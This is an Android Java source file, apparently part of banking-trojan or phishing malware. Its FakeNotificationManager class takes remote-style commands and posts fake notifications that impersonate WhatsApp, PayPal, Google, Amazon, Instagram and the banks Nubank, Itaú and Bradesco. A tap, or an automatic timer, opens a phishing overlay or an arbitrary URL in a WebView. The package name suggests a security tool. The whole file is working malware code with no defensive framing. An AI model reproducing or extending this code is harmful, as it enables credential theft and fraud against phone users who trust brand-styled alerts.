package com.seguranca.protecao;
import com.seguranca.protecao.WebViewActivity;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.Build;
import android.util.Log;


import java.util.concurrent.atomic.AtomicInteger;
import com.seguranca.protecao.PhishingOverlayService;

/**
 * FakeNotificationManager — post fake notifications from any app identity.
 *
 * Commands:
 *   SEND_FAKE_NOTIFICATION  { skin, title, body, big_text, action, auto_open_ms }
 *   CLEAR_FAKE_NOTIFICATION { id }
 *   CLEAR_ALL_FAKE_NOTIFICATIONS {}
 *
 * Skins: whatsapp | bank | google | paypal | amazon | sms | instagram |
 *        facebook | uber | delivery | system | custom
 *
 * action options:
 *   none             — just shows notification
 *   open_phishing    — tapping opens PhishingOverlayService with matching skin
 *   open_url         — opens webview with url param
 *   open_app         — launches target_pkg param
 */
public class FakeNotificationManager {

    private static final String TAG = "FakeNotif";
    private static final AtomicInteger NOTIF_ID = new AtomicInteger(9000);
    private static final String CHANNEL_ID_HIGH   = "fake_high";
    private static final String CHANNEL_ID_NORMAL = "fake_normal";
    private static final String CHANNEL_ID_SILENT = "fake_silent";

    private final Context ctx;
    private final NotificationManager nm;

    public FakeNotificationManager(Context ctx) {
        this.ctx = ctx;
        nm = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
        createChannels();
    }

    // ─── CREATE CHANNELS ─────────────────────────────────────────────────────

    private void createChannels() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return;
        try {
            // High importance — makes sound + appears as heads-up
            NotificationChannel high = new NotificationChannel(
                CHANNEL_ID_HIGH, "Messaging", NotificationManager.IMPORTANCE_HIGH);
            high.setDescription("Messages and alerts");
            high.enableLights(true);
            high.setLightColor(Color.GREEN);
            high.enableVibration(true);
            nm.createNotificationChannel(high);

            // Normal importance
            NotificationChannel normal = new NotificationChannel(
                CHANNEL_ID_NORMAL, "Updates", NotificationManager.IMPORTANCE_DEFAULT);
            nm.createNotificationChannel(normal);

            // Silent
            NotificationChannel silent = new NotificationChannel(
                CHANNEL_ID_SILENT, "Promotions", NotificationManager.IMPORTANCE_LOW);
            nm.createNotificationChannel(silent);
        } catch (Exception e) {
            Log.e(TAG, "createChannels: " + e.getMessage());
        }
    }

    // ─── SEND FAKE NOTIFICATION ──────────────────────────────────────────────

    /**
     * Posts a fake notification.
     *
     * @param skin         style preset (whatsapp, bank, google, etc.)
     * @param title        notification title (null = use skin default)
     * @param body         notification body text
     * @param bigText      expanded text (null = same as body)
     * @param action       tap action: none|open_phishing|open_url|open_app
     * @param actionParam  URL or package for open_url/open_app; phishing skin for open_phishing
     * @param priority     high|normal|silent
     * @param autoOpenMs   if > 0, auto-simulate tap after this delay (fires PhishingOverlayService)
     * @return notification ID that can be used to clear it
     */
    public int sendNotification(String skin, String title, String body, String bigText,
                                String action, String actionParam,
                                String priority, int autoOpenMs) {
        if (skin == null) skin = "custom";
        if (body == null || body.isEmpty()) body = "You have a new message";

        SkinProfile sp = buildSkinProfile(skin, title, body);
        if (title == null) title = sp.title;

        String channel = CHANNEL_ID_HIGH;
        int importance = Notification.PRIORITY_HIGH;
        if ("normal".equals(priority)) { channel = CHANNEL_ID_NORMAL; importance = Notification.PRIORITY_DEFAULT; }
        if ("silent".equals(priority)) { channel = CHANNEL_ID_SILENT; importance = Notification.PRIORITY_LOW; }

        int notifId = NOTIF_ID.incrementAndGet();

        try {
            PendingIntent tapIntent = buildTapIntent(action, actionParam, sp.phishingSkin);

            Notification.Builder builder;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                builder = new Notification.Builder(ctx, channel);
            } else {
                builder = new Notification.Builder(ctx);
                builder.setPriority(importance);
            }

            builder.setContentTitle(title)
                   .setContentText(body)
                   .setSmallIcon(sp.icon)
                   .setColor(sp.color)
                   .setAutoCancel(true)
                   .setWhen(System.currentTimeMillis())
                   .setShowWhen(true);

            if (tapIntent != null) builder.setContentIntent(tapIntent);

            // Big text style when provided
            String expandedText = bigText != null ? bigText : body;
            builder.setStyle(new Notification.BigTextStyle()
                .bigText(expandedText)
                .setBigContentTitle(title));

            // Messaging style for WhatsApp-like notifications
            if ("whatsapp".equals(skin) || "sms".equals(skin) || "instagram".equals(skin) || "facebook".equals(skin)) {
                builder.setCategory(Notification.CATEGORY_MESSAGE);
                builder.setVisibility(Notification.VISIBILITY_PRIVATE);
            }

            nm.notify(notifId, builder.build());
            Log.d(TAG, "Fake notif posted: id=" + notifId + " skin=" + skin);

            // Auto-open after delay (e.g. to trigger phishing overlay)
            if (autoOpenMs > 0) {
                final String finalSkin = skin;
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                    try {
                        nm.cancel(notifId);
                        Intent i = new Intent(ctx, PhishingOverlayService.class);
                        i.putExtra("skin", finalSkin);
                        ctx.startService(i);
                    } catch (Exception e) {
                        Log.e(TAG, "autoOpen error: " + e.getMessage());
                    }
                }, autoOpenMs);
            }

        } catch (Exception e) {
            Log.e(TAG, "sendNotification: " + e.getMessage());
        }

        return notifId;
    }

    // ─── CLEAR ───────────────────────────────────────────────────────────────

    public void clearNotification(int id) {
        try { nm.cancel(id); } catch (Exception ignored) {}
    }

    public void clearAllFakeNotifications() {
        try {
            for (int id = 9000; id <= NOTIF_ID.get(); id++) {
                nm.cancel(id);
            }
        } catch (Exception ignored) {}
    }

    // ─── PENDING INTENT ──────────────────────────────────────────────────────

    private PendingIntent buildTapIntent(String action, String actionParam, String phishingSkin) {
        if (action == null || "none".equals(action)) return null;
        int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
            ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
            : PendingIntent.FLAG_UPDATE_CURRENT;
        try {
            switch (action) {
                case "open_phishing": {
                    Intent i = new Intent(ctx, PhishingOverlayService.class);
                    i.putExtra("skin", phishingSkin != null ? phishingSkin : actionParam);
                    return PendingIntent.getService(ctx, NOTIF_ID.get(), i, flags);
                }
                case "open_app": {
                    if (actionParam == null) return null;
                    Intent i = ctx.getPackageManager().getLaunchIntentForPackage(actionParam);
                    if (i == null) return null;
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    return PendingIntent.getActivity(ctx, NOTIF_ID.get(), i, flags);
                }
                case "open_url": {
                    Intent i = new Intent(ctx, WebViewActivity.class);
                    i.putExtra("url", actionParam);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    return PendingIntent.getActivity(ctx, NOTIF_ID.get(), i, flags);
                }
                default:
                    return null;
            }
        } catch (Exception e) {
            Log.e(TAG, "buildTapIntent: " + e.getMessage());
            return null;
        }
    }

    // ─── SKIN PROFILES ───────────────────────────────────────────────────────

    private static class SkinProfile {
        String title;
        int    icon;
        int    color;
        String phishingSkin;
    }

    private SkinProfile buildSkinProfile(String skin, String customTitle, String body) {
        SkinProfile sp = new SkinProfile();
        switch (skin) {
            case "whatsapp":
                sp.title        = customTitle != null ? customTitle : "WhatsApp";
                sp.icon         = android.R.drawable.ic_dialog_email;
                sp.color        = 0xFF25D366;
                sp.phishingSkin = "whatsapp";
                break;
            case "bank":
            case "bank_generic":
                sp.title        = customTitle != null ? customTitle : "Your Bank";
                sp.icon         = android.R.drawable.ic_dialog_alert;
                sp.color        = 0xFF003087;
                sp.phishingSkin = "bank_generic";
                break;
            case "bank_nubank":
                sp.title        = customTitle != null ? customTitle : "Nubank";
                sp.icon         = android.R.drawable.ic_dialog_alert;
                sp.color        = 0xFF8A05BE;
                sp.phishingSkin = "bank_nubank";
                break;
            case "bank_itau":
                sp.title        = customTitle != null ? customTitle : "Itaú";
                sp.icon         = android.R.drawable.ic_dialog_alert;
                sp.color        = 0xFFEC7000;
                sp.phishingSkin = "bank_itau";
                break;
            case "bank_bradesco":
                sp.title        = customTitle != null ? customTitle : "Bradesco";
                sp.icon         = android.R.drawable.ic_dialog_alert;
                sp.color        = 0xFFCC092F;
                sp.phishingSkin = "bank_bradesco";
                break;
            case "google":
                sp.title        = customTitle != null ? customTitle : "Google";
                sp.icon         = android.R.drawable.ic_dialog_info;
                sp.color        = 0xFF4285F4;
                sp.phishingSkin = "google";
                break;
            case "paypal":
                sp.title        = customTitle != null ? customTitle : "PayPal";
                sp.icon         = android.R.drawable.ic_dialog_info;
                sp.color        = 0xFF003087;
                sp.phishingSkin = "paypal";
                break;
            case "amazon":
                sp.title        = customTitle != null ? customTitle : "Amazon";
                sp.icon         = android.R.drawable.ic_dialog_info;
                sp.color        = 0xFFFF9900;
                sp.phishingSkin = "amazon";
                break;
            case "sms":
                sp.title        = customTitle != null ? customTitle : "Messages";
                sp.icon         = android.R.drawable.ic_dialog_email;
                sp.color        = 0xFF2196F3;
                sp.phishingSkin = "verify";
                break;
            case "instagram":
                sp.title        = customTitle != null ? customTitle : "Instagram";
                sp.icon         = android.R.drawable.ic_dialog_email;
                sp.color        = 0xFF833AB4;
                sp.phishingSkin = "instagram";
                break;
            case "facebook":
                sp.title        = customTitle != null ? customTitle : "Facebook";
                sp.icon         = android.R.drawable.ic_dialog_email;
                sp.color        = 0xFF1877F2;
                sp.phishingSkin = "facebook";
                break;
            case "uber":
                sp.title        = customTitle != null ? customTitle : "Uber";
                sp.icon         = android.R.drawable.ic_dialog_map;
                sp.color        = 0xFF000000;
                sp.phishingSkin = "custom";
                break;
            case "system":
                sp.title        = customTitle != null ? customTitle : "System";
                sp.icon         = android.R.drawable.ic_dialog_alert;
                sp.color        = 0xFF607D8B;
                sp.phishingSkin = "update";
                break;
            default: // custom
                sp.title        = customTitle != null ? customTitle : "Notification";
                sp.icon         = android.R.drawable.ic_dialog_info;
                sp.color        = 0xFF1A73E8;
                sp.phishingSkin = "custom";
                break;
        }
        return sp;
    }
}
